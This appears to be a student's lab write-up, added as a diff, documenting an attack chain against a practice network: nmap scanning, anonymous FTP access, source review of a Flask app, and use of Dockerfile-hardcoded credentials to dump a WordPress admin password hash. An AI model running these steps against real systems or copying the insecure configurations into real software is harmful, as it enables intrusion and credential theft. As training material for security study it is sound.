@@ -1,0 +1,190 @@
+
+3.B — Hacking Technique in the Lab: Lateral Movement & Attack Chain
+
+Phase 1: Network Reconnaissance and Service Discovery (nmap)**
+
+What the technique does: It performs an active service and version detection scan (`-sV`) targeted **specifically at the internal hosts of the Corporate Network. 
+It utilizes aggressive timing ("-T4") to accelerate probe response speeds and filters the output using "--open" to immediately isolate potential attack vectors within the private segment by discarding closed or filtered ports.
+
+Why it works: Network services open sockets (ports) to accept incoming traffic. By sending crafted TCP packets toward these ports from a position with internal network visibility and meticulously 
+analyzing the structural responses or application banners returned, `nmap` can accurately deduce the specific software and exact version running within the corporate environment.
+Evidence (Command + Output):
+    bash
+    @Dicami ➔ /workspaces/Integrative-Project-Build-Boot-and-Attack/Black-Hat-Bash/lab (master)$ nmap -sV --open -T4 10.1.0.13 10.1.0.14 10.1.0.15 10.1.0.16
+    
+    Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org) ) at 2026-06-19 22:54 UTC
+    Nmap scan report for 10.1.0.13
+    Host is up (0.00034s latency).
+    Not shown: 999 closed tcp ports (conn-refused)
+    PORT     STATE SERVICE VERSION
+    8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.12.3)
+
+    Nmap scan report for 10.1.0.14
+    Host is up (0.00082s latency).
+    Not shown: 999 closed tcp ports (conn-refused)
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    
+
+What information/access was obtained & Technical Interpretation:**
+    While no direct system access or credentials were acquired during this phase, it achieved a tactical mapping and complete reconnaissance of the Corporate Network (`10.1.0.0/24`),
+gathering critical strategic intelligence about the internal infrastructure that remains hidden from the outside:
+    
+1. Host 10.1.0.13 (c-backup-01): It was determined to expose port "8080/tcp" running `SimpleHTTPServer 0.6` under "Python 3.12.3". Even though this node serves as a backend backup component, 
+running an unhardened development server internally represents a high-interest target due to potential structural leaks or lack of strict internal firewalls.
+2. Host 10.1.0.14 (c-redis-01): The scan detected an active "OpenSSH 7.9p1" service on port "22/tcp" hosted on a "Linux" system (specifically "Debian 10+deb10u2")
+. Identifying an active SSH daemon inside a backend container segment (like Redis) provides a critical asset pivot point for lateral movement or weak credential auditing.
+
+The scan mapped out active infrastructure components within the target subnet, identifying two highly relevant attack vectors:
+- Host 10.1.0.13 (c-backup-01): Exposes port 8080/tcp running a SimpleHTTPServer 0.6 (Python 3.12.3).
+- Host 10.1.0.14 (c-redis-01): Exposes port 22/tcp running an instance of OpenSSH 7.9p1 on Debian 10.
+
+This initial footprint defined the target surface. Further active routing enumeration exposed an internal file transfer node at IP 172.16.10.11, which was selected as the next tactical target.
+
+Phase 2: Vulnerability Exploitation & Information Gathering (Anonymous FTP Access)
+What the technique does: It consists of exploiting a weak configuration in the File Transfer Protocol (FTP) service by utilizing an unauthenticated session known as an Anonymous Login. 
+This technique aims to access the directory tree of the remote server without requiring valid credentials assigned to a specific user.
+Why it works: By default or due to poor administrative practices in internal environments, FTP servers (in this case, vsFTPd 3.0.5) 
+are sometimes configured to allow the anonymous or ftp username with any password (or left blank). If the filesystem Access Control Lists (ACLs) are not properly segregated, 
+an attacker with network visibility can navigate through backup or production directories and extract sensitive corporate information.
+Evidence (Command + Output):
+@Dicami ➔ /workspaces/Integrative-Project-Build-Boot-and-Attack/Black-Hat-Bash/lab (master) $ ftp 172.16.10.11
+Connected to 172.16.10.11.
+220 (vsFTPd 3.0.5)
+Name (172.16.10.11:codespace): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> cd backup/acme-hyper-branding
+250 Directory successfully changed.
+ftp>
+What information/access was obtained and Technical Interpretation:
+Configuration Breach: The 230 Login successful response code confirmed that the vsFTPd 3.0.5 server permitted anonymous access, directly exposing infrastructure data.
+Movement and Exfiltration: Upon executing the cd backup/acme-hyper-branding command, the server responded with a 250 Directory successfully changed status code, 
+validating the existence of an exposed corporate backup directory. From this point, the process moved forward to identify and download (exfiltrate) 
+critical files for subsequent static analysis—most notably, the source code of the main web application (app.py).
+
+
+Phase 3: Source Code Review & Code Analysis (app.py)
+What the technique does: It corresponds to a static code analysis phase (White-box Source Code Review) conducted after successfully exfiltrating 
+the files from the FTP server. The objective is to audit the internal structure of the application to identify hidden routes, environment variables,
+active debugging configurations, or logical flaws in request handling.
+
+Why it works: Having direct access to the source code eliminates the need for blind testing (Black-box fuzzing). 
+It allows for a microscopic inspection of how the application processes user data, mapping out all available endpoints (web routes),
+and verifying the presence of sanitization failures or insecure execution modes.
+Evidence (Command + Output):
+@Dicami ➔ /workspaces/Integrative-Project-Build-Boot-and-Attack/Black-Hat-Bash/lab (master) $ cat app.py
+import os, subprocess
+
+from flask import (
+    Flask,
+    send_from_directory,
+    send_file,
+    render_template,
+    request
+)
+
+app = Flask(__name__, template_folder=".", static_folder='static',)
+app.debug = True
+app.config['UPLOAD_FOLDER'] = "uploads/"
+
+@app.route('/')
+def hello_world():
+    return render_template('index.html')
+
+@app.route('/files/<path:path>')
+def files(path):
+...
+What information/access was obtained and Technical Interpretation:
+Active Debug Mode: The line app.debug = True reveals that the Flask web server is running in development mode. In production environments,
+this is extremely dangerous because if an unhandled exception occurs, Flask will render an interactive Werkzeug console in the browser. 
+This potentially allows for Remote Code Execution (RCE) via default or leaked PINs.
+Dangerous Module Imports: The presence of import subprocess indicates that the application directly interacts with the underlying operating system
+at the shell level.
+Route Exposure Surface: The endpoint @app.route('/files/<path:path>') was discovered. Although the snippet is truncated in the capture, 
+the use of a dynamic parameter <path:path> combined with functions like send_from_directory or send_file indicates a high risk of Path Traversal 
+(Directory Traversal) or arbitrary file read vulnerabilities if the input parameter is not rigorously sanitized.
+
+Database Exploitation & Sensitive Data Exfiltration (Advanced Level)
+Chosen Level: Advanced — Reproduce a technique guided by a later chapter against the lab (Full Infrastructure Pivot & Data Exfiltration).
+What the technique does: This technique involves exploiting insecurely stored credentials discovered during source code/infrastructure reviews
+to gain direct administrative access to a backend database server. Once inside, it utilizes database querying techniques to map out tables and exfiltrate
+highly sensitive corporate records, such as cryptographic password hashes and user accounts
+
+Why it works: Developers often leave hardcoded credentials within configuration files or container manifests (like a Dockerfile) in internal environments.
+If the database service (in this case, MariaDB running on 10.1.0.16) is exposed across the internal subnet without strict network-level access controls, 
+an attacker who uncovers these credentials can bypass all web-tier application logic and interact directly with the database engine.
+
+Evidence (Command + Output):
+Step 1: Discovering the Insecure Environment Variables
+
+@Dicami ➔ /workspaces/Integrative-Project-Build-Boot-and-Attack/Black-Hat-Bash/lab (master) $ cat machines/c-db-02/Dockerfile
+FROM mariadb:10.6.4-focal
+# Metadata
+LABEL name="c-db-02"
+LABEL company="ACME Infinity Servers"
+
+ENV MYSQL_ROOT_PASSWORD="root"
+ENV MYSQL_DATABASE="wordpress"
+ENV MYSQL_USER="wordpress"
+ENV MYSQL_PASSWORD="wordpress"
+
+Step 2: Provisioning the Attack Tool
+@Dicami ➔ /workspaces/Integrative-Project-Build-Boot-and-Attack/Black-Hat-Bash/lab (master) $ sudo apt install mysql-client -y
+Reading package lists... Done
+Building dependency tree... Done
+...
+Unpacking mysql-client-dev (8.0.46-0ubuntu0.24.04.2) over (8.0.45-0ubuntu0.24.04.1) ...
+
+Step 3: Authenticating and Mapping the Database Structure 
+@Dicami ➔ /workspaces/Integrative-Project-Build-Boot-and-Attack/Black-Hat-Bash/lab (master) $ mysql -h 10.1.0.16 -u wordpress -pwordpress wordpress
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 14
+Server version: 5.5.5-10.6.4-MariaDB-1:10.6.4+maria~focal mariadb.org binary distribution
+
+mysql> show tables;
++-----------------------+
+| Tables_in_wordpress   |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_term_meta          |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+12 rows in set (0.00 sec)
+
+Step 4: Exfiltrating Administrator Credentials
+mysql> select user_login, user_pass, user_email from wp_users;
++------------+------------------------------------+--------------------------------+
+| user_login | user_pass                          | user_email                     |
++------------+------------------------------------+--------------------------------+
+| jtorres    | $P$BVO7KQKhlmQ/M5f.cbQNyegYC38cNG/ | jtorres@acme-impact-alliance.com |
++------------+------------------------------------+--------------------------------+
+1 row in set (0.00 sec)
+What information/access was obtained & Technical Interpretation:
+Credential Leakage Exploitation: Analyzing the Dockerfile exposed the plaintext credentials (wordpress / wordpress).
+This validated a critical security flaw: storing sensitive secrets inside image blueprints.
+
+Direct Database Access: Using the native mysql-client, a remote connection was successfully established to the MariaDB instance.
+The show tables; command confirmed the host runs a WordPress database schema, containing 12 distinct tables.
+
+Critical Data Exfiltration: By targeting the wp_users table, corporate credentials for the administrator account jtorres were stolen (jtorres@acme-impact-alliance.com).
+
+Cryptographic Analysis: The acquired password hash ($P$BVO7KQKhlmQ/M5f.cbQNyegYC38cNG/) uses the phpass / MD5 (WordPress) hashing algorithm. 
+This hash can now be extracted into an external cracking system (like Hashcat or John the Ripper) to reverse it into plaintext, 
+providing the exact password needed to hijack the user's sessions across other enterprise platforms.
+
+
+Made by: Camila Villagran
